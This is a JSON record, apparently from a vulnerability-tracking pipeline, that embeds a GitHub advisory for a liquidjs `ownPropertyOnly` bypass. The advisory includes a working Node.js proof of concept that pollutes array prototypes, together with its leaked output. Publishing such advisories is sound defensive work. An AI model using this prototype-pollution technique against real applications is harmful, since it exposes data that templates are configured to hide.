@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 2, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/99596518?v=4\", \"events_url\": \"https://api.github.com/users/Nuhiat-Arefin/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Nuhiat-Arefin/followers\", \"following_url\": \"https://api.github.com/users/Nuhiat-Arefin/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Nuhiat-Arefin/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Nuhiat-Arefin\", \"id\": 99596518, \"login\": \"Nuhiat-Arefin\", \"node_id\": \"U_kgDOBe-45g\", \"organizations_url\": \"https://api.github.com/users/Nuhiat-Arefin/orgs\", \"received_events_url\": \"https://api.github.com/users/Nuhiat-Arefin/received_events\", \"repos_url\": \"https://api.github.com/users/Nuhiat-Arefin/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Nuhiat-Arefin/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Nuhiat-Arefin/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Nuhiat-Arefin\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-106120\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 6.0, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-200\", \"name\": \"Exposure of Sensitive Information to an Unauthorized Actor\"}], \"description\": \"## Summary\\n\\nLiquidJS’s `ownPropertyOnly` option is intended to prevent templates from reading inherited or prototype properties from scope data. \\nWith `ownPropertyOnly: true`, direct access such as:\\n\\n```liquid\\n{{ a[0] }}\\n```\\n\\ncorrectly blocks an inherited array index. However, the same inherited value is still disclosed through:\\n\\n```text\\n.first\\n.last\\nnegative indexing\\nfor-loop iteration\\nfirst\\nlast\\njoin\\nreverse\\nslice\\ncompact\\n```\\n\\n## Impact\\n\\nThis is an information disclosure issue when an application relies on `ownPropertyOnly: true` to safely render templates over untrusted or prototype-polluted scope data.\\n\\nObject prototype property reads are blocked as expected, but inherited `Array.prototype` index reads are not consistently blocked. An attacker who can influence prototype state or inherited array-index data may cause templates to disclose values that `ownPropertyOnly` is expected to hide.\\n\\n\\n## Proof of concept\\n\\n```js\\nconst { Liquid } = require(\\\"liquidjs\\\");\\n\\nconst engine = new Liquid({ ownPropertyOnly: true });\\n\\nArray.prototype[0] = \\\"ARRAY_PROTO_POLLUTED\\\";\\nObject.prototype.secret = \\\"OBJECT_PROTO_POLLUTED\\\";\\n\\nconst a = [];\\na.length = 1;\\n\\nconst o = {};\\n\\nfor (const [src, scope] of [\\n  [\\\"{{ a[0] }}\\\", { a }],\\n  [\\\"{{ a[-1] }}\\\", { a }],\\n  [\\\"{{ o.secret }}\\\", { o }],\\n  [\\\"{{ a.first }}\\\", { a }],\\n  [\\\"{{ a.last }}\\\", { a }],\\n  [\\\"{{ a | first }}\\\", { a }],\\n  [\\\"{{ a | last }}\\\", { a }],\\n  [\\\"{{ a | join: ',' }}\\\", { a }],\\n  [\\\"{{ a | reverse | first }}\\\", { a }],\\n  [\\\"{{ a | slice: 0, 1 | join: ',' }}\\\", { a }],\\n  [\\\"{{ a | compact | join: ',' }}\\\", { a }],\\n  [\\\"{% for x in a %}[{{ x }}]{% endfor %}\\\", { a }],\\n]) {\\n  console.log(src, \\\"=>\\\", JSON.stringify(engine.parseAndRenderSync(src, scope)));\\n}\\n\\ndelete Array.prototype[0];\\ndelete Object.prototype.secret;\\n```\\n\\n## Observed behavior\\n\\n```text\\n{{ a[0] }}                                  => \\\"\\\"\\n{{ a[-1] }}                                 => \\\"ARRAY_PROTO_POLLUTED\\\"\\n{{ o.secret }}                              => \\\"\\\"\\n{{ a.first }}                               => \\\"ARRAY_PROTO_POLLUTED\\\"\\n{{ a.last }}                                => \\\"ARRAY_PROTO_POLLUTED\\\"\\n{{ a | first }}                             => \\\"ARRAY_PROTO_POLLUTED\\\"\\n{{ a | last }}                              => \\\"ARRAY_PROTO_POLLUTED\\\"\\n{{ a | join: ',' }}                         => \\\"ARRAY_PROTO_POLLUTED\\\"\\n{{ a | reverse | first }}                   => \\\"ARRAY_PROTO_POLLUTED\\\"\\n{{ a | slice: 0, 1 | join: ',' }}           => \\\"ARRAY_PROTO_POLLUTED\\\"\\n{{ a | compact | join: ',' }}               => \\\"ARRAY_PROTO_POLLUTED\\\"\\n{% for x in a %}[{{ x }}]{% endfor %}       => \\\"[ARRAY_PROTO_POLLUTED]\\\"\\n```\\n\\n## Expected behavior\\n\\nWhen `ownPropertyOnly: true` is enabled, inherited array indices should be treated as absent, matching the behavior of:\\n\\n```liquid\\n{{ a[0] }}\\n{{ o.secret }}\\n```\\n\\nInherited or prototype-provided array-index values should not be exposed through array filters, array properties, negative indexing, or loop iteration.\\n\\n## Root cause\\n\\n`ownPropertyOnly` appears to be enforced in `readJSProperty()`, but several array-element access paths use raw or native array operations instead.\\n\\nExamples include:\\n\\n```text\\nnegative indexing using obj[obj.length + key]\\nreadFirst/readLast using obj[0] / obj[obj.length - 1]\\nfilters such as first, last, join, reverse, slice, and compact operating on arrays through native element reads\\nfor-loop iteration materializing inherited array indices\\n```\\n\\nBecause these paths do not consistently check whether an array index is an own property, inherited array indices can be read even when `ownPropertyOnly` is enabled.\", \"ghsa_id\": \"GHSA-fwxr-j5w2-587m\", \"github_reviewed_at\": \"2026-10-07T16:19:09Z\", \"html_url\": \"https://github.com/advisories/GHSA-fwxr-j5w2-587m\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-fwxr-j5w2-587m\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-106120\"}], \"nvd_published_at\": \"2026-10-06T19:17:42Z\", \"published_at\": \"2026-10-07T16:19:09Z\", \"references\": [\"https://github.com/harttle/liquidjs/security/advisories/GHSA-fwxr-j5w2-587m\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-106120\", \"https://github.com/harttle/liquidjs/pull/924\", \"https://github.com/harttle/liquidjs/commit/552819a84b80c62306fe61072628a756272dc749\", \"https://github.com/harttle/liquidjs/releases/tag/v10.27.2\", \"https://github.com/advisories/GHSA-fwxr-j5w2-587m\"], \"repository_advisory_url\": \"https://api.github.com/repos/harttle/liquidjs/security-advisories/GHSA-fwxr-j5w2-587m\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/harttle/liquidjs\", \"summary\": \"LiquidJS: ownPropertyOnly bypass for inherited array indices in first/last/join/reverse/slice/compact, `.first`/`.last`, negative index, and for-loop iteration\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-07T16:19:10Z\", \"url\": \"https://api.github.com/advisories/GHSA-fwxr-j5w2-587m\", \"vulnerabilities\": [{\"first_patched_version\": \"10.27.2\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"liquidjs\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 10.27.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-fwxr-j5w2-587m",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "liquidjs: <= 10.27.1"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-106120"
+    ],
+    "cvss_score": 6.0,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "liquidjs"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-10-07T19:15:14.141418Z",
+  "provenance": {
+    "content_sha256": "78cbe8c7d25fca45d2176aeec1c62ec048732717277947114f9b2e99a1b6ddae",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-07T16:19:09Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-fwxr-j5w2-587m",
+  "status": "active",
+  "title": "LiquidJS: ownPropertyOnly bypass for inherited array indices in first/last/join/reverse/slice/compact, `.first`/`.last`, negative index, and for-loop iteration",
+  "updated_at": "2026-10-07T16:19:10Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-fwxr-j5w2-587m"
+}
